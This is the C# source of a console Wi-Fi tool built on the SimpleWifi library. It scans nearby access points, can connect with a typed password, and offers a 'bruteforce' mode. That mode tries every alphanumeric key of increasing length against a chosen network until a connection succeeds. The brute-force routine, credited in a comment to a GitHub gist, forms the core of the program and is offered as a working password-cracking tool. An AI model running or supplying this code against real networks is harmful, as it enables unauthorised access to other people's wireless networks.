using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SimpleWifi.Win32;
using SimpleWifi;
using System.Reflection.Emit;
using System.Security.Cryptography.X509Certificates;

namespace Wifi
{
    class Program
    {

        public static void Main(string[] args)
        {
            SimpleWifi.Wifi wifi = new SimpleWifi.Wifi();
            WifiList();
            wifi.ConnectionStatusChanged += ChangeStatus;
            ConsoleAction();
        }

        private static string[] WifiChose()
        {
            List<string> arr = new List<string>();
            int i = 0;
            SimpleWifi.Wifi wifi = new SimpleWifi.Wifi();
            foreach (AccessPoint access in wifi.GetAccessPoints())
            {
                arr.Add(access.Name);
                int[] length = { i.ToString().Length, access.Name.Length };
                Console.WriteLine("+" + string.Join("+", MakeCase(length)) + "+");
                Console.WriteLine($"| {i} | {access.Name} |");
                Console.WriteLine("+" + string.Join("+", MakeCase(length)) + "+");
                i++;
            }
            return arr.ToArray();
        }

        /*
          Using Github code from https://gist.github.com/jwoschitz/1129249 for Brute Force (Edited)
         */
        private static AccessPoint BrutreForceAccess;
        private static string result;
        private static bool isMatched = false;
        private static int charactersToTestLength = 0;
        private static long computedKeys = 0;
        private static char[] charactersToTest =
        {
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
        'u', 'v', 'w', 'x', 'y', 'z','A','B','C','D','E',
        'F','G','H','I','J','K','L','M','N','O','P','Q','R',
        'S','T','U','V','W','X','Y','Z','1','2','3','4','5',
        '6','7','8','9','0'
        };
        private static void startBruteForce(int keyLength)
        {
            char[] keyChars = createCharArray(keyLength, charactersToTest[0]);
            int indexOfLastChar = keyLength - 1;
            createNewKey(0, keyChars, keyLength, indexOfLastChar);
        }
        private static char[] createCharArray(int length, char defaultChar)
        {
            return (from c in new char[length] select defaultChar).ToArray();
        }
        private static void createNewKey(int currentCharPosition, char[] keyChars, int keyLength, int indexOfLastChar)
        {
            int nextCharPosition = currentCharPosition + 1;
            for (int i = 0; i < charactersToTestLength; i++)
            {
                keyChars[currentCharPosition] = charactersToTest[i];
                if (currentCharPosition < indexOfLastChar)
                {
                    createNewKey(nextCharPosition, keyChars, keyLength, indexOfLastChar);
                }
                else
                {
                    computedKeys++;
                    if(BrutreForceAccess.IsValidPassword((new String(keyChars))))
                    {
                        if (BrutreForceAccess.Connect(new AuthRequest(BrutreForceAccess)))
                        {
                            if (!isMatched)
                            {
                                isMatched = true;
                                result = new String(keyChars);
                            }
                            return;
                        }
                    }
                }
            }
        }
        /*
         * END BRUTE FORCE CODE
         */


        private static void BruteForce(AccessPoint access)
        {
            BrutreForceAccess = access;
            DateTime timeStarted = DateTime.Now;
            Console.WriteLine("Start BruteForce - {0}", timeStarted.ToString());

            charactersToTestLength = charactersToTest.Length;
            int estimatedPasswordLength = 0;

            while (!isMatched)
            {
                estimatedPasswordLength++;
                Console.WriteLine("Update number length to: "+estimatedPasswordLength + " at "+ DateTime.Now.Subtract(timeStarted).TotalSeconds);
                startBruteForce(estimatedPasswordLength);
            }

            Console.WriteLine("Password found. - {0}", DateTime.Now.ToString());
            Console.WriteLine("Time passed: {0}s", DateTime.Now.Subtract(timeStarted).TotalSeconds);
            Console.WriteLine("Resolved password: {0}", result);
            Console.WriteLine("Computed keys: {0}", computedKeys);
        }

        private static string WifiFocus = String.Empty;
        private static bool Pass = false;
        private static bool Bf = false;
        private static void ConsoleAction()
        {
            SimpleWifi.Wifi wifi = new SimpleWifi.Wifi();
            
            
            while (true)
            {
                if (Pass)
                {
                    if(WifiFocus != String.Empty)
                    {
                        Console.Write($"\n[@{WifiFocus}]>");
                    }
                    else
                    {
                        Console.Write("\n[@]>");
                    }
                }
                else if (Bf)
                {
                    if (WifiFocus != String.Empty)
                    {
                        Console.Write($"\n[#{WifiFocus}]>");
                    }
                    else
                    {
                        Console.Write("\n[#]>");
                    }
                }
                else
                {
                    Console.Write("\n[$]>");
                }
                string[] input = Console.ReadLine().Split(new char[0]);
                
                if (Pass)
                {
                    if(WifiFocus != String.Empty)
                    {
                        if(input[0] == "exit")
                        {
                            WifiFocus = String.Empty;
                        }
                        else
                        {
                            foreach (AccessPoint access in wifi.GetAccessPoints())
                            {
                                if (access.Name == WifiFocus)
                                {
                                    ;
                                    if (access.IsValidPassword(input[0]))
                                    {
                                        Console.WriteLine("\nValide Password !");
                                        if(access.Connect(new AuthRequest(access)))
                                        {
                                            Console.WriteLine("Connexion Success !");
                                        }
                                        else
                                        {
                                            Console.WriteLine("Connexion Failed !");
                                        }
                                        WifiFocus = String.Empty;
                                    }
                                    else
                                    {
                                        Console.WriteLine("\nInvalid Password !");
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        switch (input[0])
                        {
                            case "exit":
                                WifiFocus = String.Empty;
                                Pass = false;
                                break;
                            case "chose":
                            case "list":
                                string[] options = WifiChose();
                                Console.Write("\n[@Number]>");
                                string inpu = Console.ReadLine();
                                int pos = 0;
                                try
                                {
                                    pos = int.Parse(inpu);
                                    for (int i = 0; i < options.Length; i++)
                                    {
                                        if (i == pos)
                                        {
                                            WifiFocus = options[i];
                                        }
                                    }
                                }
                                catch { }
                                break;
                            case "help":
                                Console.WriteLine("\n list\n chose\n exit\n help");
                                break;
                        }
                    }
                }else if (Bf)
                {


                    if (WifiFocus != String.Empty)
                    {
                        if (input[0] == "exit")
                        {
                            WifiFocus = String.Empty;
                        }
                        else if(input[0] == "start")
                        {
                            foreach (AccessPoint access in wifi.GetAccessPoints())
                            {
                                if (access.Name == WifiFocus)
                                {
                                    BruteForce(access);
                                }
                            }
                        }
                    }
                    else
                    {
                        switch (input[0])
                        {
                            case "exit":
                                Bf = false;
                                break;
                            case "help":
                                Console.WriteLine("\n list\n help\n exit");
                                break;
                            case "list":
                                string[] options = WifiChose();
                                Console.Write("\n[#Number]>");
                                string inpu = Console.ReadLine();
                                int pos = 0;
                                try
                                {
                                    pos = int.Parse(inpu);
                                    for (int i = 0; i < options.Length; i++)
                                    {
                                        if (i == pos)
                                        {
                                            WifiFocus = options[i];
                                        }
                                    }
                                }
                                catch { }
                                break;
                        }
                    }   
                }
                else
                {
                    if (input.Length == 1)
                    {
                        switch (input[0])
                        {
                            case "list":
                                WifiList();
                                break;
                            case "help":
                                Console.WriteLine("\n list [name]\n chose <action> (password,bf,bruteforce,disconnect)\n disconnect\n none\n default\n help\n exit");
                                break;
                            case "exit":
                                Environment.Exit(0);
                                break;
                            case "disconnect":
                                wifi.Disconnect();
                                break;
                            case "none":
                            case "default":
                                Pass = false;
                                Bf = false;
                                break;
                        }
                    }
                    else
                    {
                        if (input.Length == 2)
                        {
                            if (input[0] == "list")
                            {
                                WifiList(input[1]);
                            }
                            else if (input[0] == "chose")
                            {
                                switch (input[1])
                                {
                                    case "disconnect":
                                        wifi.Disconnect();
                                        break;
                                    case "password":
                                        Pass = true;
                                        Bf = false;
                                        break;
                                    case "bf":
                                        Pass = false;
                                        Bf = true;
                                        break;
                                    case "bruteforce":
                                        Pass = false;
                                        Bf = true;
                                        break;
                                }
                            }
                        }
                    }
                }
            }
        }

        private static string getDate()
        {  
            return DateTime.Now.ToString("yyyy-mm-dd hh:m:ss");
        }

        private static void ChangeStatus(object sender, WifiStatusEventArgs e)
        {
            int[] length = { "!".Length,"Change status".Length, e.NewStatus.ToString().Length+1 };
            Console.WriteLine("\n\n+" + string.Join("+", MakeCase(length)) + "+");
            Console.WriteLine($"| ! | Change status |  {e.NewStatus} |");
            Console.WriteLine("+" + string.Join("+", MakeCase(length)) + "+");
            if (Pass)
            {
                if (WifiFocus != String.Empty)
                {
                    Console.Write($"\n[@{WifiFocus}]>");
                }
                else
                {
                    Console.Write("\n[@]>");
                }
            }
            else if (Bf)
            {
                if (WifiFocus != String.Empty)
                {
                    Console.Write($"\n[#{WifiFocus}]>");
                }
                else
                {
                    Console.Write("\n[#]>");
                }
            }
            else
            {
                Console.Write("\n[$]>");
            }
        }

        private static  string[] MakeCase(int[] length)
        {
            List<string> list = new List<string>();
            foreach(int l in length)
            {
                string big = "";
                for(int i = 0; i < l+2; i++)
                {
                    big += "-";
                }
                list.Add(big);
            }
            return list.ToArray();
        }

        private static void LogAccessPoint(AccessPoint access)
        {
            string status = access.IsConnected ? "Connected" : "Disconnected";
            int[] length = { access.Name.Length, status.Length, access.IsSecure.ToString().Length, access.SignalStrength.ToString().Length };
            Console.WriteLine("+" + string.Join("+", MakeCase(length)) + "+");
            Console.WriteLine($"| {access.Name} | {status} | {access.IsSecure} | {access.SignalStrength} |");
            Console.WriteLine("+" + string.Join("+", MakeCase(length)) + "+");
        }

        private static void WifiList(string name ="")
        {
            SimpleWifi.Wifi wifi = new SimpleWifi.Wifi();
            Console.WriteLine("+------+--------+--------+-------+");
            Console.WriteLine("| Name | Status | Secure | Debit |");
            Console.WriteLine("+------+--------+--------+-------+");
            if (name == String.Empty)
            {
                foreach (AccessPoint access in wifi.GetAccessPoints())
                {
                    LogAccessPoint(access);
                }
            }
            else
            {
                foreach (AccessPoint access in wifi.GetAccessPoints())
                {
                    if (access.Name.Contains(name))
                    {
                        LogAccessPoint(access);
                    }
                }
            }
        }
    }
}
